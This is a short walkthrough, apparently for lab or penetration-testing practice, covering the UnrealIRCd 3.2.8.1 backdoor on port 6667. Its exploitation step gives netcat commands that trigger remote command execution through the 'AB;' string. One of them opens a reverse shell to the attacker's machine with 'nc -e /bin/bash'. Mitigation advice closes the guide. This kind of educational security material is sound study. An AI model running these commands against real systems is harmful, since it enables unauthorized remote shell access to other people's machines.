Full Walkthrough: UnrealIRCd Backdoor (Port 6667)
Theory & Background
Between November 2009 and June 2010, the UnrealIRCd source code download contained a malicious backdoor. Anyone who downloaded and installed the software from the official mirrors during this period had a backdoored version. The backdoor allows remote attackers to execute arbitrary commands by sending a specially crafted AB command to the listening IRC port.

Step-by-Step Walkthrough
1. Identification
bash
nmap -p6667 -sV <target_ip>
nmap -p6667 --script irc-unrealircd-backdoor <target_ip>
Expected Result: The version scan (-sV) might show a version number like 3.2.8.1. The NSE script will confirm if the backdoor is present.

2. Exploitation
The backdoor is triggered by sending the string AB followed by a system command.

bash
# Using netcat to exploit the backdoor
echo "AB; whoami;" | nc -nv <target_ip> 6667

# For a reverse shell (more useful)
# On your machine, set up a listener first: nc -nlvp 4444
echo "AB; nc -e /bin/bash <your_ip> 4444;" | nc -nv <target_ip> 6667
What to do: The output of the command (e.g., root) may be returned in the IRC MOTD banner. For a reverse shell, your listener will catch the connection.

3. Mitigation
Immediate Action: Immediately upgrade UnrealIRCd to the latest version from the official website.

Network Control: Restrict access to the IRC port using a firewall, allowing only trusted IP ranges to connect.

Verification: If you suspect a compromise, check for unauthorized processes, user accounts, and other backdoors, as the system may have been fully compromised.